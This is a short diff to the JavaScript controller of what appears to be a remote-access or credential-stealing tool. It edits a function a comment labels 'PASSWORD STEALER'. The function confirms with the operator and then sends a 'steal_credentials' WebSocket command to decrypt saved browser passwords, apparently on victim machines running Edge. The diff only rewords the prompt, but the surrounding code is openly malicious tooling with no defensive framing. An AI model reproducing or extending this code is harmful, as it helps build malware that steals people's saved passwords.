@@ -444,7 +444,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // PASSWORD STEALER (CŨ - Chỉ dùng cho Edge)
     window.requestStealPass = (browser) => {
-        if(confirm(`Decrypt passwords for ${browser}? (Only works on Edge/Old Chrome)`)) {
+        if(confirm(`Decrypt passwords for ${browser}? (Only works on Edge)`)) {
             sendWsMessage({ command: 'steal_credentials', browser: browser });
         }
     };
